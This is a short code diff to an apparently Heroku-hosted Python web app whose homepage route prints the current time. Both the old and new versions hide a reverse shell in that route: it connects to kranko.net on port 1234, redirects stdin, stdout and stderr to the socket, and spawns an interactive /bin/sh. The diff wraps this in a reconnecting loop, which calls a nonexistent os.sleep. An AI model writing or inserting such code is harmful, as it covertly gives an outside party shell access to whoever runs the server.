@@ -7,14 +7,16 @@ import socket,subprocess,os
 def homepage():
     the_time = datetime.now().strftime("%A, %d %b %Y %l:%M %p")
 
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(("kranko.net",1234))
-    os.dup2(s.fileno(),0)
-    os.dup2(s.fileno(),1)
-    os.dup2(s.fileno(),2)
+    while True:
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(("kranko.net",1234))
+        os.dup2(s.fileno(),0)
+        os.dup2(s.fileno(),1)
+        os.dup2(s.fileno(),2)
 
-    p=subprocess.call(["/bin/sh","-i"])
-    
+        p=subprocess.call(["/bin/sh","-i"])
+        os.sleep(999)
+
     return """
     <h1>Hello heroku</h1>
     <p>It is currently {time}.</p>
